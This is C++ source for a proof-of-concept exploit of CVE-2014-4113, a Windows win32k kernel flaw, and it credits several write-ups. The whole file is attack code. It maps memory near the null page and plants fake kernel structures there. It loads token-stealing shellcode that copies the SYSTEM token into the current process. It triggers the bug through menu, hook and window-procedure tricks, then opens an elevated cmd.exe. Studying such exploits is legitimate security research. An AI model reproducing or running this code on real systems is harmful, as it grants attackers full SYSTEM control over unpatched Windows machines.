//reference from
//https://b2ahex.github.io/blog/2017/06/13/4113%E5%88%86%E6%9E%90/index.html
//https://blogs.360.cn/post/dump-to-poc-to-win32k-kernel-privilege-escalation-vulnerability.html
//https://github.com/sam-b/CVE-2014-4113
#include<windows.h>
#include<cstdio>

EXTERN_C;
HMENU menu1 = 0;
HMENU menu2 = 0;
static VOID
xxCreateCmdLineProcess(VOID) {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}


ULONG64 getWin32ThreadInfo() {
	__asm {
		mov rax, gs:0x30
		mov rax, [rax+0x78]
		mov [rsp], rax
	}
}




LRESULT CALLBACK WNDProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	printf("WindProc called with message=0x%x\n", uMsg);
	
	if (uMsg == WM_ENTERIDLE) {
		printf("cchh\n");
		PostMessageA(hwnd, WM_NCLBUTTONDOWN, 0, 0);//pass
	}
	PostMessageA(hwnd, WM_KEYDOWN, VK_DOWN, 0);//click menu to make spwndNextPopup != 0
	PostMessageA(hwnd, WM_KEYDOWN, VK_RIGHT, 0);
	PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WNDProc2(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	if (uMsg == 0x1eb) {
		EndMenu();//clear
		return 0x00000000fffffffb;  //trigger
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam) {
	printf("Hook callback\n");
	CWPSTRUCT* ptag = (CWPSTRUCT*)lParam;
	if (ptag->message == 0x1eb) {
		UnhookWindowsHook(WH_CALLWNDPROC, HookCallback);
		SetWindowLongPtrA(ptag->hwnd, GWLP_WNDPROC, (LONG_PTR)WNDProc2); //替换窗口过程函数， 等待win32k对窗口发消息
	}
	return CallNextHookEx(0, code, wParam, lParam);
}


int main() {
	printf("[+]%d\n", SetCursorPos(100, 100));
	CHAR ShellCode[] =
		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"			// mov rdx, [gs:188h];		get _ETHREAD pointer from KPCR
		"\x4C\x8B\x42\x70"								// mov r8, [rdx + 70h];		_EPROCESS(see PsGetCurrentProcess function)
		"\x4D\x8B\x88\x88\x01\x00\x00"					// mov r9, [r8 + 188h];		ActiveProcessLinks list head
		"\x49\x8B\x09"									// mov rcx, [r9];			follow link to first process in list
														//find_system_proc:
		"\x48\x8B\x51\xF8"							// mov rdx, [rcx - 8];		offset from ActiveProcessLinks to UniqueProcessId
		"\x48\x83\xFA\x04"							// cmp rdx, 4;				process with ID 4 is System process
		"\x74\x05"									// jz found_system;			found SYSTEM token
		"\x48\x8B\x09"								// mov rcx, [rcx];			follow _LIST_ENTRY Flink pointer
		"\xEB\xF1"									// jmp find_system_proc;	loop
													//get_system_token:
		"\x48\x8B\x81\x80\x00\x00\x00"				// mov rax, [rcx + 80h];	offset from ActiveProcessLinks to Token
		"\x24\xF0"									// and al, 0f0h;			clear low 4 bits of _EX_FAST_REF structure
													//copy_token:
		"\x49\x89\x80\x08\x02\x00\x00"				// mov[r8 + 208h], rax;		copy SYSTEM token to current process's token
													//return:
		"\xc3"										// ret
		;
	typedef NTSTATUS(WINAPI* PNtAllocateVirtualMemory)(
		HANDLE ProcessHandle,
		PVOID* BaseAddress,
		ULONG ZeroBits,
		PULONG AllocationSize,
		ULONG AllocationType,
		ULONG Protect
		);
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (!hNtdll) {
		printf("Load ntdll handle error\n");
		return 1;
	}
	
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	ULONG64 addr = 0xfffff000;
	ULONG64 size = 0x2000;
	NTSTATUS result = NtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&addr, 0, (PULONG)&size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (result) {
		printf("Allocate 0 addr memory error:%p\n",result);
		return 1;
	}
	//__debugbreak();
	*(PULONG64)((ULONG64)0xfffffffb + 0x10) = getWin32ThreadInfo();
	*(PULONG64)((ULONG64)0xfffffffb + 0x2a) = 4;
	*(PULONG64)((ULONG64)0xfffffffb + 0x90) = (ULONG64)0x100000000+0x500;
	memcpy((void*)(0x100000000 + 0x500),ShellCode,sizeof(ShellCode));
	
	//return 1;
	WNDCLASSA WNDClass = {0};
	WNDClass.lpfnWndProc = WNDProc;
	WNDClass.hInstance = GetModuleHandle(NULL);//If this parameter is NULL, GetModuleHandle returns a handle to the file used to create the calling process (.exe file).
	WNDClass.lpszClassName = "cchh";
	RegisterClassA(&WNDClass);

	HWND hWindow = CreateWindowA(WNDClass.lpszClassName, "cchh", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 250, 250, 0, 0, WNDClass.hInstance, 0);


	menu1 = CreatePopupMenu();
	if (!menu1) {
		printf("Fail to create menu one\n");
		return 1;
	}
	MENUITEMINFOA menuinfo = { 0 };
	menuinfo.cbSize = sizeof(MENUITEMINFOA);
	menuinfo.fMask = MIIM_STRING;
	if (!InsertMenuItemA(menu1, 0, 1, &menuinfo)) {
		printf("Fail to insert menu1\n");
		DestroyMenu(menu1);
		return 1;
	}

	menu2 = CreatePopupMenu();
	if (!menu2) {
		printf("Fail to create menu one\n");
		return 1;
	}
	
	char haha[] = "cchh";
	MENUITEMINFOA menuinfo2 = { 0 };
	menuinfo2.cbSize = sizeof(MENUITEMINFOA);
	
	menuinfo2.hSubMenu = menu1;
	menuinfo2.dwTypeData = haha;
	menuinfo2.cch = sizeof(haha);
	menuinfo2.fMask = (MIIM_STRING | MIIM_SUBMENU);
	if (!InsertMenuItemA(menu2, 0, 1, &menuinfo2)) {
		printf("Fail to insert menu two\n");
		DestroyMenu(menu1);
		DestroyMenu(menu2);
		return 1;
	}
	HHOOK setWindowsHook = SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId());

	if (setWindowsHook == NULL) {
		printf("Failed to insert call back one.\n");
		DestroyMenu(menu1);
		DestroyMenu(menu2);
		return 1;
	}

	TrackPopupMenu(menu2, 0, 0, 0, 0, hWindow, 0);
	DestroyWindow(hWindow);
	xxCreateCmdLineProcess();
	return 0;
}